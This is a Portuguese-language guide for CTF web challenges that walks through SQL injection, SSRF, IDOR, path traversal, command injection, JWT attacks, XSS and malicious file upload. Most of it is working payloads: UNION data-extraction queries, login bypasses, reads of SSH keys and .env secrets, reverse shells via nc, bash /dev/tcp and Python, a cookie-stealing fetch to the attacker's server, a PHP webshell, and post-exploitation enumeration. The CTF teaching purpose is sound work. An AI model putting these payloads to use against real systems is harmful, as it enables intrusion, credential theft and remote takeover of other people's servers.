# Guia de Vulnerabilidades Web para CTF
### Como identificar, testar e explorar — CTF Pink Hat

Metodologia base para todas as categorias:
```
Entrada → Parâmetro → Teste → Resposta → Pista → Exploração
```

Ferramentas usadas ao longo do guia: **Burp Suite** (proxy/Repeater), **cURL**, **DevTools do navegador**.

---

## Índice
1. [SQL Injection](#1-sql-injection)
2. [SSRF (Server-Side Request Forgery)](#2-ssrf)
3. [IDOR / Broken Access Control](#3-idor--broken-access-control)
4. [Path Traversal / Local File Inclusion](#4-path-traversal--lfi)
5. [Command Injection](#5-command-injection)
6. [Falhas de Autenticação e Sessão](#6-falhas-de-autenticação-e-sessão)
7. [XSS (Cross-Site Scripting)](#7-xss-cross-site-scripting)
8. [Upload de Arquivos Malicioso](#8-upload-de-arquivos-malicioso)
9. [Checklist geral de reconhecimento web](#9-checklist-geral-de-reconhecimento-web)
10. [Do RCE à shell (conectando tudo)](#10-do-rce-à-shell-conectando-tudo)

---

## 1. SQL Injection

### Onde suspeitar
Qualquer parâmetro que provavelmente alimenta uma query: `id`, `search`, `user`, `order`, `filter`, campos de login, headers customizados (`X-Forwarded-For` às vezes é logado em SQL).

### Como identificar
| Payload | O que observar |
|---|---|
| `id=15'` | Erro de sintaxe SQL na resposta, status 500, mensagem tipo `SQLSTATE`, `unterminated quoted string` |
| `id=15''` | Se a página voltar ao normal (aspas se cancelam), reforça a suspeita |
| `id=15 AND 1=1` vs `id=15 AND 1=2` | Resposta idêntica ao original vs resposta vazia/diferente → parâmetro influencia a query |
| `id=15'--` ou `id=15'#` | Comenta o resto da query — se não der erro, o banco aceitou o truncamento |

### Como explorar (UNION-based)

**Passo 1 — descobrir número de colunas:**
```sql
id=15 ORDER BY 1-- -
id=15 ORDER BY 2-- -
id=15 ORDER BY 3-- -
```
Pare quando der erro `Unknown column` — o número anterior é a contagem de colunas.

**Passo 2 — descobrir colunas refletidas na tela:**
```sql
id=-1 UNION SELECT 1,2,3-- -
```
Use `id=-1` (valor inexistente) para forçar a query original a não retornar nada, deixando só o resultado do UNION visível.

**Passo 3 — extrair schema (se não souber nomes de tabela/coluna):**
```sql
id=-1 UNION SELECT table_name,2,3 FROM information_schema.tables-- -
id=-1 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
```

**Passo 4 — extrair dados:**
```sql
id=-1 UNION SELECT username,password,3 FROM users-- -
```

### Bypass de autenticação
```sql
usuário: admin'-- -
usuário: admin' OR '1'='1'-- -
usuário: ' OR 1=1-- -
senha: (qualquer valor, será comentado)
```

### Blind SQL Injection (quando não há erro/reflexo visível)
```sql
id=15 AND 1=1        → resposta normal
id=15 AND 1=2        → resposta diferente (booleano)
id=15 AND SLEEP(5)   → resposta demora 5s (time-based)
```
Extração de dados via blind exige automação — nesse caso, vale usar **sqlmap** depois de confirmar manualmente que existe injeção:
```bash
sqlmap -u "http://<TARGET_IP>/product?id=15" --batch --dbs
```

### Workflow no Burp
1. Capturar a requisição em **Proxy → HTTP history**
2. Botão direito → **Send to Repeater**
3. Editar o parâmetro, dar Send, comparar respostas (status, Content-Length, corpo)
4. Usar múltiplas abas do Repeater pra comparar payloads lado a lado
5. Aba **Comparer** para diffs grandes

---

## 2. SSRF

### Onde suspeitar
Funcionalidades que "buscam algo por você": preview de link, webhook, upload por URL, integração com API externa, conversor de imagem/PDF a partir de URL.

### Como identificar
```json
{"url": "http://127.0.0.1"}
{"url": "http://127.0.0.1:8080"}
{"url": "http://localhost/admin"}
```
Envie via cURL ou pelo Repeater:
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:9000"}' \
  http://<TARGET_IP>/api
```
**O que observar:** a resposta reflete conteúdo de um serviço interno — conecta diretamente com o que `ss -tulnp` revelou na enumeração local (ex: `127.0.0.1:9000` só acessível de dentro).

### Como confirmar
Use seu próprio servidor como "canário":
```bash
python3 -m http.server 8000   # na sua máquina
```
```json
{"url": "http://<SEU_LOCAL_IP>:8000/teste"}
```
Se a requisição chegar no seu servidor (aparece no log do `http.server`), o SSRF está confirmado — e você pode repetir trocando a URL pelo alvo interno real.

### Alvos internos clássicos em CTF
```
http://127.0.0.1:<PORTA_INTERNA_DESCOBERTA>
http://169.254.169.254/latest/meta-data/     → metadata de cloud (AWS/GCP)
file:///etc/passwd                            → alguns SSRFs aceitam protocolo file://
gopher://127.0.0.1:6379/_...                  → SSRF → Redis (avançado)
```

### Bypass de filtros comuns
```
http://127.0.0.1          → bloqueado?
http://127.1              → tenta forma abreviada
http://0.0.0.0
http://[::1]              → IPv6 localhost
http://2130706433         → 127.0.0.1 em decimal
http://localhost.attacker.com  → DNS resolvendo pra IP interno (se controlar o domínio)
```

---

## 3. IDOR / Broken Access Control

### Onde suspeitar
Qualquer identificador numérico ou previsível: `/invoice?id=1044`, `/user/42/profile`, `/api/orders/1001`.

### Como identificar
1. Capture uma requisição normal (com seu próprio ID) no Burp
2. Mande pro Repeater
3. Troque o ID por outro valor:
```
id=1044 → id=1043
id=1044 → id=1045
user_id=42 → user_id=1
```
**O que observar:** se a resposta trocar de "não autorizado/404" pra dado de outro usuário → IDOR confirmado.

### Broken Access Control (vertical)
Testar acesso a rotas de admin estando logado como usuário comum:
```
GET /admin/users
GET /admin/dashboard
```
Ou trocar o método HTTP:
```
GET /api/users/42     → 403?
POST /api/users/42    → funciona?
```

### Dica prática
No Burp, use **Match and Replace** (Proxy → Options) pra automatizar a troca de um parâmetro (ex: seu `session` cookie) em todas as requisições, testando se uma sessão de outro usuário te dá acesso indevido.

---

## 4. Path Traversal / LFI

### Onde suspeitar
Parâmetro que recebe nome de arquivo: `?file=relatorio.pdf`, `?page=home.php`, download de anexo, template engine (`?template=header`).

### Como identificar
```
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd     (bypassa filtro simples de "../")
?file=..%2f..%2f..%2fetc%2fpasswd      (URL-encoded)
?file=..%252f..%252f..%252fetc%252fpasswd  (double URL-encoded)
?file=/etc/passwd                      (path absoluto direto)
```
**O que observar:** conteúdo de `/etc/passwd` ou de um arquivo de config da aplicação aparecendo na resposta.

### Alvos valiosos depois de confirmado
```
/etc/passwd                         → usuários do sistema
/proc/self/environ                  → variáveis de ambiente do processo web
/var/www/html/config.php            → credenciais de banco
/var/www/.env                       → segredos de aplicação
~/.ssh/id_rsa                       → chave SSH privada
/var/log/apache2/access.log         → possível LFI→RCE via log poisoning
```

### LFI → RCE (log poisoning, avançado)
Se conseguir injetar PHP num log (ex: via User-Agent) e depois incluir esse log via LFI:
```
User-Agent: <?php system($_GET['cmd']); ?>
```
```
?file=../../../../var/log/apache2/access.log&cmd=id
```

### Null byte bypass (sistemas antigos/PHP < 5.3.4)
```
?file=../../../../etc/passwd%00
```

---

## 5. Command Injection

### Onde suspeitar
Funcionalidade que parece rodar comando do sistema por trás: ping, DNS lookup, conversão de arquivo, geração de relatório/PDF.

### Como identificar
```
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 `id`
127.0.0.1 $(id)
127.0.0.1%0aid          (newline encoded, bypassa alguns filtros)
```
**O que observar:** saída de `whoami`/`id` aparecendo na resposta, mesmo misturada com o resultado esperado (ex: resultado do ping seguido da saída do id).

### Blind command injection (sem output visível)
```
127.0.0.1; sleep 5      → resposta demora 5s = confirmado
127.0.0.1; curl http://<SEU_LOCAL_IP>:8000/confirmado   → aparece no seu http.server
```

### De Command Injection para Reverse Shell
Depois de confirmar, o payload vira uma shell reversa completa:

**No atacante (antes de enviar o payload):**
```bash
nc -lvnp 4444
```

**Payload injetado:**
```
127.0.0.1; nc -e /bin/bash <SEU_IP> 4444
```
ou, se `nc -e` não estiver disponível no alvo:
```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1'
```
ou via Python (comum em alvos minimalistas):
```
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<SEU_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Bypass de filtros comuns
```
Espaço bloqueado?       → use ${IFS} no lugar: cat${IFS}/etc/passwd
Palavras bloqueadas?     → concatenação: w'h'oami, w"h"oami
Ponto e vírgula bloqueado? → use %0a (newline) ou | 
```

---

## 6. Falhas de Autenticação e Sessão

### Onde suspeitar
Cookies/tokens previsíveis, JWT sem validação de assinatura, ausência de rate limit no login, funcionalidade de "esqueci a senha" fraca.

### JWT (JSON Web Token)
1. Copiar o token do cookie/header (DevTools → Application → Cookies, ou aba **Storage** no Burp)
2. Decodificar em [jwt.io](https://jwt.io) ou manualmente (Base64 do header e payload)
3. Testar ataques comuns:

**Alg None attack:**
```json
{"alg":"none","typ":"JWT"}
```
Remover a assinatura e enviar `header.payload.` (com ponto final vazio) — alguns backends mal configurados aceitam.

**Alterar claims sem re-assinar (testar se valida assinatura):**
```json
{"user":"admin","role":"admin"}
```
Trocar `role":"user"` por `role":"admin"` e reenviar — se aceitar, não há validação de assinatura.

**Secret fraco (HS256):**
Se suspeitar de chave fraca, testar brute force com `hashcat` ou `jwt_tool`:
```bash
jwt_tool <TOKEN> -C -d <WORDLIST>
```

### Sessão / Cookie
```
Testar se o cookie continua válido depois de "logout" → falha de invalidação de sessão
Testar se o ID de sessão é previsível (sequencial, timestamp) → sequestro de sessão
Testar CSRF: requisição sem token/origem validada é aceita?
```

### Rate limiting
Testar (com moderação — CTF Pink Hat proíbe brute force na **flag**, mas testar limite de tentativas de login é diferente):
```
Enviar 5-10 tentativas de login erradas seguidas pelo Repeater
→ Se não houver bloqueio/captcha, é uma falha a reportar/explorar com wordlist pequena e específica
```

---

## 7. XSS (Cross-Site Scripting)

### Onde suspeitar
Qualquer campo que reflete input do usuário na página: busca, comentários, nome de perfil, parâmetros de URL exibidos na tela.

### Como identificar
```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```
**O que observar:** se o `alert(1)` executar (popup no navegador), há XSS refletido ou armazenado.

### Reflected vs Stored
- **Refletido:** o payload só executa se você mesmo acessar a URL com ele (útil pra roubar cookie de outra sessão via link malicioso)
- **Armazenado (stored):** o payload fica salvo (ex: num comentário) e executa pra qualquer visitante — mais crítico

### Em contexto de CTF (roubo de cookie/sessão simulado)
```html
<script>fetch('http://<SEU_LOCAL_IP>:8000/?c='+document.cookie)</script>
```
Com `python3 -m http.server 8000` rodando, você recebe o cookie da "vítima" (bot automatizado do desafio, geralmente) no log.

### Bypass de filtros básicos
```html
<ScRiPt>alert(1)</sCriPt>          (case bypass)
<svg onload=alert(1)>              (tag alternativa)
<img src=x onerror=alert(1)>       (evento em vez de <script>)
javascript:alert(1)                (em contexto de href)
```

---

## 8. Upload de Arquivos Malicioso

### Onde suspeitar
Qualquer funcionalidade de upload (avatar, documento, imagem de perfil).

### Como identificar bypass de validação
```
1. Tentar subir arquivo.php diretamente → bloqueado?
2. Trocar extensão: arquivo.php5, arquivo.phtml, arquivo.pHp (case)
3. Double extension: arquivo.jpg.php
4. Null byte (sistemas antigos): arquivo.php%00.jpg
5. Content-Type spoofing: enviar .php mas declarar Content-Type: image/jpeg
6. Magic bytes: adicionar cabeçalho de imagem real (GIF89a;) antes do payload PHP
```

### Payload de webshell simples (PHP)
```php
<?php system($_GET['cmd']); ?>
```
Depois de subir com sucesso, localizar o caminho do arquivo (geralmente `/uploads/nome.php`) e acessar:
```
http://<TARGET_IP>/uploads/shell.php?cmd=id
```
Depois, evoluir pra reverse shell:
```
http://<TARGET_IP>/uploads/shell.php?cmd=nc+-e+/bin/bash+<SEU_IP>+4444
```
(com o listener `nc -lvnp 4444` já rodando)

---

## 9. Checklist geral de reconhecimento web

Antes de testar qualquer vulnerabilidade específica, sempre rodar esse checklist (uma vez por aplicação):

```
□ nmap -sC -sV -p <PORTAS> <TARGET_IP>          → confirmar porta web e tecnologia
□ curl -I http://<TARGET_IP>                    → headers, servidor, tecnologia
□ Ver código-fonte HTML (Ctrl+U) → comentários, endpoints escondidos
□ robots.txt e sitemap.xml
□ gobuster dir -u http://<TARGET_IP> -w <WORDLIST>   → diretórios escondidos
□ DevTools → Network: observar requests enquanto navega
□ DevTools → Application: cookies, localStorage, tokens
□ Testar todos os parâmetros de URL/formulário com os payloads das seções acima
□ Se houver domínio/vhost: /etc/hosts + curl -H "Host: ..."
```

---

## 10. Do RCE à shell (conectando tudo)

Qualquer vulnerabilidade que vire **execução de comando** (Command Injection, SQLi avançado com `xp_cmdshell`, upload de webshell, LFI→RCE via log poisoning) segue o mesmo padrão final:

```
1. Preparar listener na sua máquina:
   nc -lvnp 4444

2. Injetar payload de conexão reversa através da vulnerabilidade encontrada

3. Confirmar shell recebida:
   whoami
   id

4. Estabilizar a shell (opcional, mas recomendado):
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   Ctrl+Z (suspender)
   stty raw -echo; fg
   export TERM=xterm

5. Seguir para pós-exploração:
   sudo -l
   find / -perm -4000 -type f 2>/dev/null
   getcap -r / 2>/dev/null
   ps aux
```

---

## Resumo — qual payload testar primeiro em cada tipo de campo

| Tipo de campo | Primeiro teste |
|---|---|
| ID numérico na URL | IDOR (trocar valor) + SQLi (`'`) |
| Campo de busca | SQLi (`'`) + XSS (`<script>`) |
| Campo de login | SQLi bypass (`admin'-- -`) |
| Parâmetro que recebe URL | SSRF (`http://127.0.0.1`) |
| Parâmetro que recebe nome de arquivo | Path Traversal (`../../etc/passwd`) |
| Campo tipo "ping"/"lookup"/"convert" | Command Injection (`; id`) |
| Upload de arquivo | Extensão/Content-Type bypass |
| Cookie/token | Decodificar (JWT) + testar alteração de claims |

**Regra de ouro:** teste sempre o payload mais simples primeiro (uma aspa, um `; id`, um `../`) — a resposta a esse teste mínimo já indica qual categoria seguir com mais profundidade.
